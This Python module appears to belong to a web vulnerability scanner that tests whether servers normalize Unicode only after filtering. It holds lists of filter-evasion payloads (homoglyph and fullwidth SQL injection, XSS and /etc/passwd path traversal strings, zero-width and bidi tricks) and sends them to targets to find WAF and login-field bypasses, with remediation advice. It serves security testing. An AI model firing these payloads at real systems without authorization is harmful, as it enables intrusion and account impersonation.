"""
Unicode normalization attacks — filter bypass via equivalence,
homoglyphs, NFKC/NFC/NFD confusion, width manipulation, and
case-folding tricks.

CWE-176: Improper Handling of Unicode Encoding
CWE-180: Incorrect Behavior Order: Validate Before Canonicalize
"""

from __future__ import annotations

import logging
import unicodedata
from dataclasses import dataclass, field
from typing import List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient

logger = logging.getLogger(__name__)


# ------------------------------------------------------------------
# Unicode normalization payloads
# ------------------------------------------------------------------

@dataclass
class UnicodeTrick:
    """A single Unicode-based bypass payload."""
    label: str
    payload: str
    normalised_to: str
    technique: str


# --- Homoglyph payloads (visually identical, different codepoints) ---

_HOMOGLYPH_TRICKS: List[UnicodeTrick] = [
    # Cyrillic/Greek/fullwidth lookalikes for Latin
    UnicodeTrick("Cyrillic 'а' for 'a' in admin",
                 "\u0430dmin", "admin", "homoglyph"),
    UnicodeTrick("Cyrillic 'е' for 'e' in select",
                 "s\u0435lect", "select", "homoglyph"),
    UnicodeTrick("Cyrillic 'о' for 'o' in union",
                 "uni\u043En", "union", "homoglyph"),
    UnicodeTrick("Fullwidth 'A' for 'A' in ADMIN",
                 "\uff21DMIN", "ADMIN", "homoglyph"),
    UnicodeTrick("Greek 'Α' (alpha) for 'A'",
                 "\u0391DMIN", "ADMIN", "homoglyph"),
    UnicodeTrick("Cyrillic 'с' for 'c' in script",
                 "s\u0441ript", "script", "homoglyph"),
    UnicodeTrick("Fullwidth '<' for XSS",
                 "\uff1cscript\uff1e", "<script>", "homoglyph"),
    UnicodeTrick("Fullwidth single-quote for SQLi",
                 "\uff07 OR 1=1--", "' OR 1=1--", "homoglyph"),
]

# --- NFKC normalization exploits ---

_NFKC_TRICKS: List[UnicodeTrick] = [
    # Characters that NFKC-normalize to dangerous equivalents
    UnicodeTrick("Fullwidth slash (path traversal)",
                 "..\uff0f..\uff0fetc\uff0fpasswd", "../../etc/passwd", "nfkc"),
    UnicodeTrick("Fullwidth backslash",
                 "..\uff3c..\uff3cwindows\uff3cwin.ini", "..\\..\\windows\\win.ini", "nfkc"),
    UnicodeTrick("Fullwidth angle brackets (XSS)",
                 "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
                 "<script>alert(1)</script>", "nfkc"),
    UnicodeTrick("Fullwidth double-quote",
                 '\uff02 onmouseover=\uff02alert(1)', '" onmouseover="alert(1)', "nfkc"),
    UnicodeTrick("Halfwidth katakana period for dot bypass",
                 "admin\uff61example\uff61com", "admin.example.com", "nfkc"),
    UnicodeTrick("Subscript digits (₁₂₃₄)",
                 "\u2081=\u2081", "1=1", "nfkc"),
    UnicodeTrick("Superscript digits (¹²³)",
                 "\u00b9=\u00b9", "1=1", "nfkc"),
    UnicodeTrick("Roman numeral Ⅰ for 1",
                 "\u2160=\u2160", "I=I", "nfkc"),
]

# --- Case-folding tricks ---

_CASE_FOLD_TRICKS: List[UnicodeTrick] = [
    # Characters that case-fold to unexpected values
    UnicodeTrick("German eszett ß → ss",
                 "cla\u00df", "class", "case-fold"),
    UnicodeTrick("Turkish dotless ı → i",
                 "adm\u0131n", "admin", "case-fold"),
    UnicodeTrick("Kelvin sign K → k",
                 "\u212Aelvin", "kelvin", "case-fold"),
    UnicodeTrick("Angstrom Å → å",
                 "\u212Bngstrom", "ångstrom", "case-fold"),
    UnicodeTrick("Long s ſ → s",
                 "\u017Fcript", "script", "case-fold"),
    UnicodeTrick("Sigma ς → σ",
                 "clas\u03C2", "clasσ", "case-fold"),
]

# --- Width / zero-width manipulation ---

_WIDTH_TRICKS: List[UnicodeTrick] = [
    UnicodeTrick("Zero-width space between key chars",
                 "scr\u200Bipt", "script", "zero-width"),
    UnicodeTrick("Zero-width non-joiner in 'admin'",
                 "ad\u200Cmin", "admin", "zero-width"),
    UnicodeTrick("Zero-width joiner in 'select'",
                 "sel\u200Dect", "select", "zero-width"),
    UnicodeTrick("Left-to-right mark in path",
                 "../\u200Eetc/passwd", "../etc/passwd", "bidi"),
    UnicodeTrick("Right-to-left override (filename spoof)",
                 "test\u202Efdp.exe", "test\u202Efdp.exe", "bidi"),
    UnicodeTrick("Soft hyphen in keyword",
                 "sc\u00ADript", "script", "zero-width"),
    UnicodeTrick("Word joiner in keyword",
                 "uni\u2060on", "union", "zero-width"),
    UnicodeTrick("BOM prefix",
                 "\ufeffadmin", "admin", "bom"),
]

# --- Overlong / encoding confusion ---

_OVERLONG_TRICKS: List[UnicodeTrick] = [
    # These simulate what overlong UTF-8 would produce
    UnicodeTrick("Overlong dot (U+2024 one dot leader)",
                 "\u2024\u2024/etc/passwd", "../etc/passwd", "overlong"),
    UnicodeTrick("Fraction slash U+2044",
                 "..\u2044..\u2044etc\u2044passwd", "../../etc/passwd", "overlong"),
    UnicodeTrick("Division slash U+2215",
                 "..\u2215..\u2215etc\u2215passwd", "../../etc/passwd", "overlong"),
    UnicodeTrick("Set minus U+2216 for backslash",
                 "..\u2216..\u2216windows\u2216win.ini", "..\\..\\windows\\win.ini", "overlong"),
]


ALL_TRICKS = _HOMOGLYPH_TRICKS + _NFKC_TRICKS + _CASE_FOLD_TRICKS + _WIDTH_TRICKS + _OVERLONG_TRICKS


class UnicodeNormalizationChecker:
    """
    Tests whether Unicode normalization occurs after security
    filtering, enabling filter bypass.
    """

    def __init__(self, http_client: Optional[HttpClient] = None) -> None:
        self._client = http_client
        self._owns_client = http_client is not None

    async def check(self, target: Target) -> List[Finding]:
        """Run Unicode normalization checks against *target*."""
        client = self._client
        if client is None:
            return []

        findings: List[Finding] = []
        url = target.url
        method = (target.method or "GET").upper()

        findings.extend(await self._test_normalization_bypass(client, url, method, target))
        findings.extend(await self._test_homoglyph_filter_bypass(client, url, method, target))
        findings.extend(await self._test_zero_width_injection(client, url, method, target))

        return findings

    # ----------------------------------------------------------
    # Core normalization test — fire all payloads at each field
    # ----------------------------------------------------------

    async def _test_normalization_bypass(
        self, client: HttpClient, url: str, method: str, target: Target,
    ) -> List[Finding]:
        """Send Unicode trick payloads and detect if normalization happens post-filter."""
        findings: List[Finding] = []
        seen_techniques: set[str] = set()
        sep = "&" if "?" in url else "?"

        for trick in ALL_TRICKS:
            if trick.technique in seen_techniques:
                continue

            try:
                if method in ("POST", "PUT", "PATCH"):
                    resp = await client.request(
                        method, url,
                        json_body={"input": trick.payload},
                        headers={"Content-Type": "application/json"},
                    )
                else:
                    sep = "&" if "?" in url else "?"
                    probe_url = f"{url}{sep}q={trick.payload}"
                    resp = await client.request("GET", probe_url)

                if resp.status_code not in range(200, 500):
                    continue

                body = resp.text
                # Detect if the normalised form appears in response
                # when the original trick payload should have been blocked
                if trick.normalised_to in body and trick.payload not in body:
                    findings.append(Finding(
                        title=f"Unicode normalization bypass ({trick.technique}): {trick.label}",
                        description=(
                            f"Input '{trick.payload}' was normalised to '{trick.normalised_to}' "
                            f"in the server response. This suggests security filtering occurs "
                            f"BEFORE Unicode normalization, allowing bypass."
                        ),
                        severity=Severity.MEDIUM,
                        target=target,
                        evidence=(
                            f"Technique: {trick.technique}\n"
                            f"Payload: {repr(trick.payload)}\n"
                            f"Normalised to: {trick.normalised_to}\n"
                            f"Status: {resp.status_code}"
                        ),
                        remediation=(
                            "Apply Unicode normalization (NFKC) BEFORE security "
                            "filtering or input validation."
                        ),
                        cwe=176,
                        tags=["unicode", trick.technique, "filter-bypass", "grotassault"],
                    ))
                    seen_techniques.add(trick.technique)

                # Also check: payload accepted where plain text rejected (WAF bypass)
                if resp.status_code in (200, 201) and trick.normalised_to.lower() in (
                    "admin", "select", "union", "script"
                ):
                    # Try the plain version to see if it's blocked
                    try:
                        if method in ("POST", "PUT", "PATCH"):
                            plain_resp = await client.request(
                                method, url,
                                json_body={"input": trick.normalised_to},
                                headers={"Content-Type": "application/json"},
                            )
                        else:
                            plain_url = f"{url}{sep}q={trick.normalised_to}"
                            plain_resp = await client.request("GET", plain_url)

                        if plain_resp.status_code in (400, 403, 406, 429):
                            findings.append(Finding(
                                title=f"WAF bypass via Unicode {trick.technique}: {trick.label}",
                                description=(
                                    f"Plain input '{trick.normalised_to}' was blocked "
                                    f"(HTTP {plain_resp.status_code}) but Unicode variant "
                                    f"'{trick.payload}' was accepted (HTTP {resp.status_code})."
                                ),
                                severity=Severity.HIGH,
                                target=target,
                                evidence=(
                                    f"Blocked: {trick.normalised_to} → {plain_resp.status_code}\n"
                                    f"Accepted: {repr(trick.payload)} → {resp.status_code}"
                                ),
                                remediation="Normalize Unicode input before WAF/filter evaluation.",
                                cwe=180,
                                tags=["unicode", "waf-bypass", trick.technique, "grotassault"],
                            ))
                            seen_techniques.add(trick.technique)

                    except (httpx.HTTPError, OSError, ValueError):
                        pass

            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings

    # ----------------------------------------------------------
    # Homoglyph-specific: username/email filter bypass
    # ----------------------------------------------------------

    async def _test_homoglyph_filter_bypass(
        self, client: HttpClient, url: str, method: str, target: Target,
    ) -> List[Finding]:
        """Test homoglyph bypass on auth-related fields."""
        if method not in ("POST", "PUT", "PATCH"):
            return []

        homoglyph_tests = [
            ("username", "\u0430dmin", "admin"),
            ("email", "\u0430dmin@example.com", "admin@example.com"),
            ("login", "r\u043Eot", "root"),
        ]

        findings: List[Finding] = []

        for field_name, trick_val, plain_val in homoglyph_tests:
            try:
                resp = await client.request(
                    method, url,
                    json_body={field_name: trick_val, "password": "test"},
                    headers={"Content-Type": "application/json"},
                )

                if resp.status_code in (200, 201, 302):
                    findings.append(Finding(
                        title=f"Homoglyph bypass on field '{field_name}'",
                        description=(
                            f"Server accepted homoglyph username '{trick_val}' "
                            f"(visually identical to '{plain_val}'). This may allow "
                            f"account impersonation or duplicate account creation."
                        ),
                        severity=Severity.HIGH,
                        target=target,
                        evidence=f"Field: {field_name}\nHomoglyph: {repr(trick_val)}\nTarget: {plain_val}",
                        remediation="Normalize Unicode (NFKC) and reject confusable characters on identity fields.",
                        cwe=176,
                        tags=["unicode", "homoglyph", "account-takeover", "grotassault"],
                    ))
                    break

            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings

    # ----------------------------------------------------------
    # Zero-width character injection
    # ----------------------------------------------------------

    async def _test_zero_width_injection(
        self, client: HttpClient, url: str, method: str, target: Target,
    ) -> List[Finding]:
        """Test if zero-width characters survive storage and display."""
        zw_chars = [
            ("\u200B", "zero-width space"),
            ("\u200C", "zero-width non-joiner"),
            ("\u200D", "zero-width joiner"),
            ("\u2060", "word joiner"),
            ("\uFEFF", "BOM / zero-width no-break space"),
        ]

        findings: List[Finding] = []

        for char, name in zw_chars:
            payload = f"test{char}value"
            try:
                if method in ("POST", "PUT", "PATCH"):
                    resp = await client.request(
                        method, url,
                        json_body={"input": payload},
                        headers={"Content-Type": "application/json"},
                    )
                else:
                    sep = "&" if "?" in url else "?"
                    resp = await client.request("GET", f"{url}{sep}q={payload}")

                if resp.status_code in range(200, 400) and char in resp.text:
                    findings.append(Finding(
                        title=f"Zero-width character preserved: {name}",
                        description=(
                            f"The server accepted and preserved a {name} (U+{ord(char):04X}) "
                            f"in the response. Zero-width characters can bypass length limits, "
                            f"spoof display names, and evade keyword filters."
                        ),
                        severity=Severity.LOW,
                        target=target,
                        evidence=f"Character: {name} (U+{ord(char):04X})\nPayload: {repr(payload)}",
                        remediation="Strip zero-width and control characters from user input.",
                        cwe=176,
                        tags=["unicode", "zero-width", "grotassault"],
                    ))
                    break  # One finding per endpoint is enough

            except (httpx.HTTPError, OSError, ValueError):
                continue

        return findings
